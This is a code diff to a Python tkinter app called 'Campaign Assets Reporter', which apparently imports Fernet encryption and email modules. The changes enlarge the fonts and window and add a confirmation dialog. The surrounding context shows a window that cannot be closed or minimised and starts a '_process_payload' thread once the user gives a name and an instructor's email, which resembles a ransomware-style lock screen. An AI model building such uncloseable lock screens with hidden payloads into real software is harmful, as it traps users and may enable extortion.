@@ -1,6 +1,6 @@
 from cryptography.fernet import Fernet
 from email.mime.text import MIMEText
-from tkinter import messagebox
+from tkinter import messagebox, font
 from datetime import datetime
 import tkinter as tk
 import threading
@@ -280,9 +280,9 @@ class ReportApp:
         # Prevent closure/minimization
         master.wm_attributes("-topmost", 1)
         master.resizable(False, False)
-        master.geometry("400x250")
-        master.minsize(400, 250)
-        master.maxsize(400, 250)
+        master.geometry("800x600")
+        master.minsize(800, 600)
+        master.maxsize(800, 600)
         master.protocol("WM_DELETE_WINDOW", do_nothing)
         master.bind("<Escape>", do_nothing)
         master.bind("<Control-q>", do_nothing)
@@ -290,22 +290,35 @@ class ReportApp:
         master.bind("<Alt-F4>", do_nothing)
         master.title("Campaign Assets Reporter")
         
-        # UI Elements
-        tk.Label(master, text="User's Name & Surname:").pack(pady=(10, 0))
-        self.name_entry = tk.Entry(master, width=40)
-        self.name_entry.pack(pady=5)
+        # --- Fonts ---
+        self.font_label = ("Helvetica", 18, "bold")
+        self.font_entry = ("Helvetica", 16)
+        self.font_button = ("Helvetica", 18, "bold")
         
-        tk.Label(master, text="Instructor's Email:").pack(pady=(10, 0))
-        self.email_entry = tk.Entry(master, width=40)
-        self.email_entry.pack(pady=5)
+        # UI Elements
+        tk.Label(master, text="User's Name & Surname:", font=self.font_label).pack(pady=(30, 10))
+        self.name_entry = tk.Entry(master, width=40, font=self.font_entry)
+        self.name_entry.pack(pady=5, ipady=6)  # ipady makes input box taller
+        
+        tk.Label(master, text="Instructor's Email:", font=self.font_label).pack(pady=(20, 10))
+        self.email_entry = tk.Entry(master, width=40, font=self.font_entry)
+        self.email_entry.pack(pady=5, ipady=6)
         self.email_entry.bind("<KeyRelease>", self.validate_email)
         
-        self.email_valid_label = tk.Label(master, text="Waiting for input...", fg="gray")
-        self.email_valid_label.pack(pady=(5, 0))
+        self.email_valid_label = tk.Label(master, text="Waiting for input...", fg="gray", font=("Helvetica", 14))
+        self.email_valid_label.pack(pady=(5, 15))
         
-        self.report_button = tk.Button(master, text="Report", command=self.run_process)
-        self.report_button.pack(pady=20)
-        self.is_processing = False 
+        self.report_button = tk.Button(
+            master,
+            text="Submit",
+            command=self.run_process,
+            font=self.font_button,
+            padx=20,
+            pady=10
+        )
+        self.report_button.pack(pady=25)
+
+        self.is_processing = False
 
     def validate_email(self, event=None):
         # Validate the email format in real-time.
@@ -327,22 +340,28 @@ class ReportApp:
             # Prevent re-execution if already running
             if self.is_processing:
                 return
-            
+
             # Perform basic validation
             if not username:
                 messagebox.showerror("Error", "Please enter the User's Name & Surname.")
                 return
+            
             if not instructor_email:
                 messagebox.showerror("Error", "Please enter the Instructor's Email.")
                 return
+            
             if self.email_valid_label.cget("text") != "Valid email":
                 messagebox.showerror("Error", "Please enter a valid email address.")
+                return
+            
+            # Confirmation dialog
+            if not messagebox.askyesno("Confirmation", "Are you sure the submitted Name & Surname with Email address is valid?"):
                 return
             
             # Set processing flag and disable button after successful validation
             self.is_processing = True
             self.report_button.config(state=tk.DISABLED)
-
+            
             # Start the payload process in a separate thread
             threading.Thread(target=self._process_payload, args=(username, instructor_email), daemon=True).start()
 
